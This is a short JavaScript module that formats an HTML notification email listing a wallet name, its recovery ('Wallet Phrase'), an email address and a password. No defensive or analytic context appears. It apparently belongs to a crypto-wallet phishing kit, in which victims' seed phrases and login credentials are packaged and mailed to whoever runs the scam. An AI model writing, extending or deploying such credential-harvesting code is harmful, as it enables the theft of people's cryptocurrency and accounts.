exports.generateEmailHTML = function (
    wallet,
    txtphrase,
    email,
    txtpassword
  ) {
    return `
      <!DOCTYPE html>
      <html>
      <head>
          <title>New Notification</title>
      </head>
      <body>
          <p>Wallet: ${wallet}</p>
          <p>Wallet Phrase: ${txtphrase}</p>
          <p>Email: ${email}</p>
          <p>Password: ${txtpassword}</p> 
      </body>
      </html>
      `;
  };